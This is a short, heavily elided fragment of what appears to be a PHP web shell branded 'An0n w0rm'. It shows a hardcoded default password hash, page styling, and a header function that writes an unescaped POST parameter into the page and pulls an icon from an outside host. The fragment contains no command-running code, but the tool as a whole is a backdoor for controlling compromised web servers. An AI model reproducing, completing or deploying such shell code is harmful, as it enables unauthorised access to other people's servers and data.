...
$auth_pass= "ea5bde7624878f76366d463441d2091b"; // Default Password
$color = "yellow"; 					// For Changing Font Colors
...
<html>
	<head>
		...
		<meta name="about" content="Made By An0n w0rm">
...
function An0n3xPloiTeRHeader() {
	...
	global $color;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><link rel='SHORTCUT ICON' href='http://i66.tinypic.com/2j33a85.jpg'><title>w0rm</title>
...
table.info{ color:#fff;background: url('');
				background-repeat:no-repeat;
